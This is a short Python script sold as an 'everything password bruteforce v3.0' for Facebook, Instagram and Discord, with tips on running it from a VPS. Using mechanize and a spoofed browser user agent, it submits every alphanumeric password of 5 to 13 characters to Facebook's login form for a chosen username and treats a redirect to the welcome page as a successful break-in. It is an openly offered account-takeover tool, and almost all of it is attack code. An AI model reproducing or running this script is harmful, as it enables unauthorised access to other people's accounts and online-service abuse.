# facebook, insta, dc and pretty much everything password bruteforce v3.0
# made by: weasley#9884 :P
# install python3 on your vps and run the script (python password_bruteforce_3.0)
# for centos 6 watch a tut its more complicated :C

# import modules
import os
import sys
import time
import base64
import string
import itertools
import mechanize

timeout00 = 00
url = 'https://www.facebook.com/'
username = '@user'
passw00 = 'ZZZZZZZ999999'

# don't touche! :P
br00 = mechanize.Browser()
br00.addheaders= [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36')]
br00.set_handle_equiv( True )
br00.set_handle_gzip( True )
br00.set_handle_redirect( True ) 
br00.set_handle_referer( True )
br00.set_handle_robots( False )	

# inject data into api
def inject_byte01(valid):
	try:
		chars = string.ascii_lowercase + string.ascii_uppercase + string.digits # + string.punctuation
		for passw_length in range(5, 14):
			for guess00 in itertools.product(chars, repeat=passw_length):
				time.sleep(timeout00)				
				guess00 = ''.join(guess00)
				br00.open('https://www.facebook.com/login.php')
				br00.select_form(nr= 0)
				br00.form['email'] = username
				br00.form['pass'] = guess00
				sub00 = br00.submit()
				print('{}, {}, {}'.format(guess00, sub00, sub00.geturl()))
				if sub00.geturl() == 'https://www.facebook.com/?sk=welcome' or guess00 == valid:
					print('~{}'.format(guess00))
					return					
	except:
		return

#kur
inject_byte01(passw00)

sys.exit()
